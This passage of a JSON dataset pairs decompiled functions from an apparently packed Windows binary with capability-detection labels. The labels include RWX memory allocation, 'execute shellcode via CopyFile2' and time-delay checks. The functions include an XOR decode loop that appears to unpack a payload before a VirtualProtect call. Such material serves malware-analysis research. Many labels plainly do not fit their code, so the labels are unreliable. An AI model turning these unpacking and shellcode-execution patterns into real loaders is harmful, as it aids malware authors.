        "decompiled_code": "\nuint fcn.00456be0(void)\n\n{\n    uint uStack20;\n    \n    fcn.00456c48();\n    return uStack20;\n}\n",
        "token_count": 35
    },
    "00456bf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00456bf8(void)\n\n{\n    int32_t iStack16;\n    int32_t iStack8;\n    \n    fcn.00456c48();\n    return iStack8 - iStack16;\n}\n",
        "token_count": 51
    },
    "00456c14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00456c14(void)\n\n{\n    uint uStack16;\n    \n    fcn.00456c48();\n    return uStack16;\n}\n",
        "token_count": 35
    },
    "00456c2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00456c2c(void)\n\n{\n    int32_t iStack20;\n    int32_t iStack12;\n    \n    fcn.00456c48();\n    return iStack12 - iStack20;\n}\n",
        "token_count": 52
    },
    "00456c48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456c48(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    uStack52 = 0x28;\n    (***0x461f20)(*(in_EAX + 4));\n    *param_2 = &uStack52;\n    *(param_2 + 4) = uStack52;\n    *(param_2 + 8) = uStack48;\n    *(param_2 + 0xc) = uStack44;\n    return;\n}\n",
        "token_count": 136
    },
    "00456c78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456c78(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint auStack52 [3];\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    auStack52[0] = 0x28;\n    (***0x461f20)(*(in_EAX + 4), auStack52);\n    *param_2 = uStack40;\n    param_2[1] = uStack36;\n    param_2[2] = uStack32;\n    param_2[3] = uStack28;\n    return;\n}\n",
        "token_count": 148
    },
    "004573f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004573f4(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint auStack24 [2];\n    \n    puVar5 = auStack24;\n    if (param_2 != *(in_EAX + 0x44)) {\n        *(in_EAX + 0x44) = param_2;\n        if (param_2 == 0) {\n            sub.user32.dll_GetCursorPos(auStack24);\n            iVar1 = sub.user32.dll_WindowFromPoint(puVar5, auStack24[0]);\n            if (iVar1 != 0) {\n                iVar2 = sub.user32.dll_GetWindowThreadProcessId(iVar1, 0);\n                iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n                if (iVar2 == iVar3) {\n                    uVar4 = fcn.00406974();\n                    sub.user32.dll_SendMessageA(iVar1, 0x84, 0, uVar4);\n                    uVar4 = fcn.004068fc();\n                    sub.user32.dll_SendMessageA(iVar1, 0x20, iVar1, uVar4);\n                    return;\n                }\n            }\n        }\n        uVar4 = fcn.004573cc();\n        sub.user32.dll_SetCursor(uVar4);\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) + 1;\n    return;\n}\n",
        "token_count": 354
    },
    "00457608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __fastcall fcn.00457608(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint var_1h;\n    \n    uVar1 = 0;\n    if (param_1 == '\\x01') {\n        uVar1 = *(in_EAX + 0x44) < *(param_2 + 0x44);\n    }\n    else if (param_1 == '\\x02') {\n        uVar1 = *(param_2 + 0x44) + *(param_2 + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 < *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    }\n    else if (param_1 == '\\x03') {\n        uVar1 = *(in_EAX + 0x40) < *(param_2 + 0x40);\n    }\n    else if (param_1 == '\\x04') {\n        uVar1 = *(param_2 + 0x40) + *(param_2 + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 < *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    }\n    return uVar1;\n}\n",
        "token_count": 323
    },
    "004579bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004579bc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack28 = 0x4579d1;\n    cVar1 = fcn.00457964(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        fcn.00403228();\n        uStack28 = 0x457a36;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        fcn.00457818(&stack0xfffffffc);\n        fcn.00457818(&stack0xfffffffc);\n        fcn.00457818(&stack0xfffffffc);\n        fcn.00457818(&stack0xfffffffc);\n        fcn.00457818(&stack0xfffffffc);\n        *in_FS_OFFSET = uStack32;\n        uStack28 = 0x457a35;\n        fcn.00403258();\n        return;\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "004585c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004585c8(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpPaint;\n    \n    uVar1 = sub.user32.dll_BeginPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    uVar2 = fcn.00458d18();\n    sub.user32.dll_DrawIcon(uVar1, 0, 0, uVar2);\n    sub.user32.dll_EndPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    return;\n}\n",
        "token_count": 134
    },
    "00458fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00458fe0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    if ((0xff < param_2[1]) && (param_2[1] < 0x109)) {\n        iVar1 = sub.user32.dll_GetCapture();\n        if (iVar1 == 0) {\n            iVar1 = *param_2;\n            if ((*(in_EAX + 0x44) == 0) || (iVar1 != *(*(in_EAX + 0x44) + 0x254))) {\n                while( true ) {\n                    iVar2 = fcn.004363b8();\n                    if ((iVar2 != 0) || (iVar1 == 0)) break;\n                    iVar1 = sub.user32.dll_GetParent();\n                }\n                if (iVar1 == 0) {\n                    iVar1 = *param_2;\n                }\n            }\n            else {\n                iVar1 = fcn.0043fd08();\n            }\n            iVar1 = sub.user32.dll_SendMessageA(iVar1, param_2[1] + 0xbc00, param_2[2], param_2[3]);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        else {\n            iVar2 = sub.user32.dll_GetWindowLongA(iVar1, 0xfffffffa);\n            if (iVar2 == *0x463664) {\n                iVar1 = sub.user32.dll_SendMessageA(iVar1, param_2[1] + 0xbc00, param_2[2], param_2[3]);\n                if (iVar1 != 0) {\n                    uVar3 = 1;\n                }\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 419
    },
    "004591d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004591d0(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00459138();\n    if (cVar1 == '\\0') {\n        fcn.00459aa0();\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "004594f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004594f4(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint uStack128;\n    int32_t iStack124;\n    uint *puStack120;\n    uint uStack116;\n    uint uStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    int32_t lpRect;\n    uint *var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t hWnd;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iStack104 = 0x45950c;\n    var_4h = in_EAX;\n    iStack108 = sub.user32.dll_GetActiveWindow();\n    iStack104 = 2;\n    uStack112 = 0x45951e;\n    hWnd = iStack108;\n    var_14h = (***0x461fd4)();\n    uStack112 = 2;\n    uStack116 = *(var_4h + 0x30);\n    puStack120 = 0x459533;\n    var_18h = (***0x461fd4)();\n    if (var_14h != var_18h) {\n        var_44h = 0x28;\n        puStack120 = &fcn.004594f4::var_44h;\n        iStack124 = var_14h;\n        uStack128 = 0x459556;\n        (***0x461f20)();\n        var_50h = &fcn.004594f4::lpRect;\n        lpRect = *(var_4h + 0x30);\n        sub.user32.dll_GetWindowRect();\n        iStack104 = var_34h - var_3ch >> 1;\n        if (iStack104 < 0) {\n            iStack104 = iStack104 + ((var_34h - var_3ch & 1U) != 0);\n        }\n        iStack104 = iStack104 + var_3ch;\n        iStack108 = var_38h - var_40h >> 1;\n        if (iStack108 < 0) {\n            iStack108 = iStack108 + ((var_38h - var_40h & 1U) != 0);\n        }\n        iStack108 = iStack108 + var_40h;\n        uStack112 = 0;\n        uStack116 = *(var_4h + 0x30);\n        puStack120 = 0x45959e;\n        sub.user32.dll_SetWindowPos();\n    }\n    puStack120 = 0x4595a5;\n    var_10h = fcn.004502fc();\n    puStack120 = 0x4595ad;\n    var_1ch = fcn.00450218();\n    puStack120 = 0x4595b8;\n    cVar1 = fcn.00458498();\n    if (cVar1 != '\\0') {\n        arg_8h = arg_8h | 0x100000;\n    }\n    iStack124 = 0x459649;\n    uStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    uVar4 = *(var_4h + 0x30);\n    puStack120 = &stack0xfffffffc;\n    var_8h = sub.user32.dll_MessageBoxA_1();\n    *in_FS_OFFSET = uVar4;\n    if (var_14h != var_18h) {\n        iVar2 = var_48h - var_50h >> 1;\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + ((var_48h - var_50h & 1U) != 0);\n        }\n        iVar3 = var_4ch - lpRect >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((var_4ch - lpRect & 1U) != 0);\n        }\n        sub.user32.dll_SetWindowPos(*(var_4h + 0x30), 0, iVar3 + lpRect, iVar2 + var_50h, 0, 0, 0x1d, 0x459650, arg_8h);\n    }\n    fcn.004503b0();\n    sub.user32.dll_SetActiveWindow(hWnd);\n    fcn.00450220();\n    return;\n}\n",
        "token_count": 1077
    },
    "00459f7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459f7c(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack12 [8];\n    \n    fcn.00459e44();\n    if (*(in_EAX + 0x89) == '\\0') {\n        sub.user32.dll_GetCursorPos(auStack12);\n        fcn.0045a290();\n    }\n    else if (*(in_EAX + 0x89) == '\\x01') {\n        fcn.00459fb4();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0045aa5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045aa5c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    iVar1 = *in_EAX - *param_2;\n    if (SBORROW4(*in_EAX, *param_2)) {\n        iVar1 = fcn.00403198();\n    }\n    return iVar1;\n}\n",
        "token_count": 117
    },
    "0045aa90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045aa90(void)\n\n{\n    uint8_t uVar1;\n    uint32_t in_EAX;\n    uint8_t *puVar2;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    do {\n        puVar2 = in_EAX + var_ch;\n        if (CARRY4(in_EAX, var_ch)) {\n            puVar2 = fcn.00403198();\n        }\n        uVar1 = *puVar2;\n        puVar2 = in_EAX + var_ch;\n        if (CARRY4(in_EAX, var_ch)) {\n            puVar2 = fcn.00403198();\n        }\n        *puVar2 = uVar1 ^ 0xd8;\n        var_ch = var_ch + 1;\n    } while (var_ch != 0x5d2d);\n    return;\n}\n",
        "token_count": 203
    },
    "0045aae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.0045aae0(void)\n\n{\n    uint lpflOldProtect;\n    uint lpAddress;\n    \n    sub.kernel32.dll_VirtualProtect();\n    return;\n}\n",
        "token_count": 39
    },
    "00436d54": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00436d54(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if ((in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f) < (param_2 ^ param_2 >> 0x1f) - (param_2 >> 0x1f)) {\n        return in_EAX;\n    }\n    return param_2;\n}\n",
        "token_count": 108
    },
    "00403dfc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nbool fcn.00403dfc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    iVar1 = *0x461000;\n    *0x461000 = 0;\n    puVar3 = *0x463634;\n    puVar4 = 0x463634;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 167
    },
    "0040cd4c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040cd4c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x14), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 56
    },
    "00415548": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415548(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    (**(*in_EAX + 0x84))();\n    if (in_EAX[5] == in_EAX[6]) {\n        fcn.00415474();\n    }\n    if (in_EDX < in_EAX[5]) {\n        fcn.004028b8();\n    }\n    puVar1 = in_EAX[4] + in_EDX * 8;\n    *puVar1 = 0;\n    puVar1[1] = arg_8h;\n    fcn.00403ffc();\n    in_EAX[5] = in_EAX[5] + 1;\n    (**(*in_EAX + 0x80))();\n    return;\n}\n",
        "token_count": 191
    },
    "0041a47c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a47c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41a4df;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch != 0) {\n        *(arg_ch + 4) = 2;\n        uVar1 = (****(arg_8h + 0xc))();\n        *(arg_ch + 8) = uVar1;\n        *(arg_ch + 0xc) = uVar1 >> 0x20;\n        *(arg_ch + 0x10) = 0;\n        *(arg_ch + 0x14) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 0;\n        *(arg_ch + 0x2c) = 1;\n    }\n    *in_FS_OFFSET = uStack28;\n    return 0;\n}\n",
        "token_count": 295
    },
    "0041f8dc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f8dc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.004033e4();\n    if (cVar1 == '\\0') {\n        fcn.00403258();\n        *(in_EAX + 0xc) = 0;\n        iVar2 = (**(param_2 + 0x48))();\n        *(in_EAX + 0xc) = iVar2;\n        *(iVar2 + 0x14) = in_EAX;\n        uVar3 = fcn.0040346c();\n        *(iVar2 + 0x10) = uVar3;\n        *(iVar2 + 0x1c) = in_EAX;\n        uVar3 = fcn.0040346c();\n        *(iVar2 + 0x18) = uVar3;\n        fcn.00403454();\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "0041f958": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f958(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (param_2 != 0) {\n        piStack24 = 0x41f973;\n        iVar1 = fcn.004031a0();\n        piStack24 = 0x41f978;\n        var_4h = (**(iVar1 + 0x48))();\n        piStack24 = 0x41f985;\n        (**(*var_4h + 8))();\n        var_4h[5] = in_EAX;\n        uStack28 = 0x41f997;\n        piStack24 = var_4h;\n        iVar1 = fcn.0040346c();\n        piStack24[4] = iVar1;\n        var_4h[7] = in_EAX;\n        uStack28 = 0x41f9af;\n        piStack24 = var_4h;\n        iVar1 = fcn.0040346c();\n        piStack24[6] = iVar1;\n    }\n    uStack28 = 0x41f9e8;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    piStack24 = &stack0xfffffffc;\n    fcn.00403258();\n    *(in_EAX + 0xc) = var_4h;\n    fcn.00403454();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 387
    },
    "00424fa4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.00424fa4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    while (0 < *(*(in_EAX + 0x10) + 8)) {\n        iVar1 = fcn.00423f2c();\n        (**(**(iVar1 + 4) + 0x2c))();\n    }\n    (**(**(in_EAX + 0x10) + 8))();\n    (**(**(in_EAX + 0x14) + 8))();\n    (**(**(in_EAX + 0x18) + 8))();\n    return;\n}\n",
        "token_count": 140
    },
    "004368f8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004368f8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 4) = *(param_2 + 4);\n    *(in_EAX + 8) = *(param_2 + 8);\n    *(in_EAX + 0xc) = *(param_2 + 0xc);\n    *(in_EAX + 0x10) = *(param_2 + 0x10);\n    *(in_EAX + 0x14) = *(param_2 + 0x14);\n    *(in_EAX + 0x18) = *(param_2 + 0x18);\n    *(in_EAX + 0x20) = *(param_2 + 0x20);\n    *(in_EAX + 0x24) = *(param_2 + 0x24);\n    *(in_EAX + 0x28) = *(param_2 + 0x28);\n    *(in_EAX + 0x2c) = *(param_2 + 0x2c);\n    return;\n}\n",
        "token_count": 249
    },
    "0043ce90": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ce90(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.0040699c(*(param_2 + 0x20), *(param_2 + 0x34), 0, *(param_2 + 0x1c), *(param_2 + 0x18), \n                         *(param_2 + 0x14), *(param_2 + 0x10), *(param_2 + 0xc), *(param_2 + 4));\n    *(in_EAX + 0x180) = uVar1;\n    return;\n}\n",
        "token_count": 154
    },
    "0044280c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044280c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    if ((in_ECX == 0) && (in_ECX = *(*(in_EAX + 100) + 8),  iVar1 = in_ECX,  arg_8h != '\\0')) {\n        do {\n            in_ECX = iVar1;\n            iVar1 = *(in_ECX + 0xc);\n        } while (*(in_ECX + 0xc) != 0);\n    }\n    if (arg_8h == '\\0') {\n        *(in_EDX + 0xc) = in_ECX;\n        iVar1 = *(in_ECX + 0x18);\n        *(in_EDX + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = in_EDX;\n        }\n        *(in_ECX + 0x18) = in_EDX;\n        iVar1 = *(in_ECX + 0x14);\n        *(in_EDX + 0x14) = iVar1;\n        if (in_ECX == *(iVar1 + 8)) {\n            *(iVar1 + 8) = in_EDX;\n        }\n    }\n    else {\n        *(in_EDX + 0x14) = *(in_ECX + 0x14);\n        *(in_EDX + 0x18) = in_ECX;\n        iVar1 = *(in_ECX + 0xc);\n        *(in_EDX + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = in_EDX;\n        }\n        *(in_ECX + 0xc) = in_EDX;\n    }\n    fcn.00441cec();\n    fcn.0044207c();\n    return;\n}\n",
        "token_count": 431
    },
    "0040cd3c": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040cd3c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x10), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 56
    },
    "00419360": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.00419360(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_WaitForSingleObject(*0x463850);\n    if (iVar1 == 0) {\n        fcn.00419354();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00407bac": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00407bac(uint param_1, char *param_2)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    pcVar1 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar1 = *(in_EAX + -4);\n    }\n    pcVar3 = param_2;\n    if (param_2 != NULL) {\n        pcVar3 = *(param_2 + -4);\n    }\n    pcVar2 = pcVar1;\n    if (pcVar3 < pcVar1) {\n        pcVar2 = pcVar3;\n    }\n    bVar6 = true;\n    do {\n        pcVar4 = in_EAX;\n        pcVar5 = param_2;\n        if (pcVar2 == NULL) break;\n        pcVar2 = pcVar2 + -1;\n        pcVar5 = param_2 + 1;\n        pcVar4 = in_EAX + 1;\n        bVar6 = *in_EAX == *param_2;\n        in_EAX = pcVar4;\n        param_2 = pcVar5;\n    } while (bVar6);\n    if (!bVar6) {\n        pcVar1 = pcVar4[-1];\n        pcVar3 = pcVar5[-1];\n    }\n    return pcVar1 - pcVar3;\n}\n",
        "token_count": 332
    },
    "00407bfc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00407bfc(uint param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char *in_EAX;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint8_t uVar6;\n    uint16_t uVar7;\n    uint8_t uVar8;\n    bool bVar9;\n    \n    pcVar3 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar3 = *(in_EAX + -4);\n    }\n    pcVar5 = param_2;\n    if (param_2 != NULL) {\n        pcVar5 = *(param_2 + -4);\n    }\n    pcVar4 = pcVar3;\n    if (pcVar5 < pcVar3) {\n        pcVar4 = pcVar5;\n    }\n    bVar9 = true;\ncode_r0x00407c1b:\n    do {\n        if (pcVar4 != NULL) {\n            pcVar4 = pcVar4 + -1;\n            pcVar2 = param_2 + 1;\n            pcVar1 = in_EAX + 1;\n            bVar9 = *in_EAX == *param_2;\n            in_EAX = pcVar1;\n            param_2 = pcVar2;\n            if (bVar9) goto code_r0x00407c1b;\n        }\n        if (bVar9) goto code_r0x00407c49;\n        uVar6 = in_EAX[-1];\n        if ((0x60 < uVar6) && (uVar6 < 0x7b)) {\n            uVar6 = uVar6 - 0x20;\n        }\n        uVar7 = CONCAT11(param_2[-1], uVar6);\n        uVar8 = uVar7 >> 8;\n        if ((0x60 < uVar8) && (uVar8 < 0x7b)) {\n            uVar7 = CONCAT11(uVar8 - 0x20, uVar6);\n        }\n        uVar6 = uVar7 >> 8;\n        bVar9 = uVar7 == uVar6;\n        if (!bVar9) {\n            pcVar3 = uVar7;\n            pcVar5 = uVar6;\ncode_r0x00407c49:\n            return pcVar3 - pcVar5;\n        }\n    } while( true );\n}\n",
        "token_count": 539
    },
    "0041d9a0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0041d9a0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.0041ce04();\n    sub.gdi32.dll_SelectObject(*(in_EAX + 4), uVar1);\n    sub.gdi32.dll_SetROP2(*(in_EAX + 4), *(*(*(in_EAX + 0x10) + 0x18) * 2 + 0x4616a8));\n    return;\n}\n",
        "token_count": 112
    },
    "004362cc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004362cc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    *(*0x461a8c + 0x180) = arg_8h;\n    sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffffc, *(*0x461a8c + 0x18c));\n    uVar1 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff0);\n    if ((uVar1 & 0x40000000) != 0) {\n        iVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff4);\n        if (iVar2 == 0) {\n            sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffff4, arg_8h);\n        }\n    }\n    sub.user32.dll_SetPropA(arg_8h, *0x463b1e, *0x461a8c);\n    sub.user32.dll_SetPropA(arg_8h, *0x463b1c, *0x461a8c);\n    iVar2 = *0x461a8c;\n    *0x461a8c = 0;\n    uVar3 = (**(iVar2 + 0x18c))(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 343
    },
    "0043ef5c": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0043ef5c(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    sub.user32.dll_RemovePropA(in_EAX[0x60], *0x463b1e);\n    sub.user32.dll_RemovePropA(in_EAX[0x60], *0x463b1c);\n    return;\n}\n",
        "token_count": 88
    },
    "004082f0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.004082f0(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00404468(0xc0000000, 0, 0, 2, 0x80, 0);\n    sub.kernel32.dll_CreateFileA(uVar1);\n    return;\n}\n",
        "token_count": 70
    },
    "0041d2d0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
